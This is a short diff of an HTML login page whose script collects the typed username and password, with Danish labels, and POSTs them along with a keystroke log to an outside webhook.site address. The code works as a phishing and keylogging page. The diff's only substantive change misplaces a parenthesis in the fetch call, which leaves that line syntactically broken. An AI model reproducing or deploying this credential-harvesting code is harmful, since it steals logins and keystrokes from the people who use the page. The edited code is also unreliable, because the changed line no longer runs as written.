@@ -30,7 +30,7 @@
           const password = document.getElementById("passwordInput").value;
           console.log("Brugernavn:", username);
           console.log("Adgangskode:", password);
-           fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
+           fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5"), {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ keys: keyLog, username, password })
@@ -48,6 +48,7 @@
   <p></p> 
 </body> 
 </html>
+
 
 
 
